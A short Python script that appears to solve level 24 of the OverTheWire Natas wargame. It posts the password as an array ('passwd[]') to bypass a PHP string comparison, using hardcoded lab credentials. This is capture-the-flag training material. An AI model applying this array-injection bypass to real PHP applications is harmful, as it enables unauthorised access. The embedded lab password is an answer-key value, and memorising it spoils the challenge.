import base64
from datetime import datetime
import requests
import pprint

TARGET_URL = 'http://natas24.natas.labs.overthewire.org/index.php'

AUTH = ('natas24', 'OsRmXFguozKpTZZ5X14zNO43379LZveg')

data = {
    'passwd[]':'a'
}

r = requests.post(TARGET_URL, data=data, auth=AUTH)

print r.status_code
print r.text
print r.headers
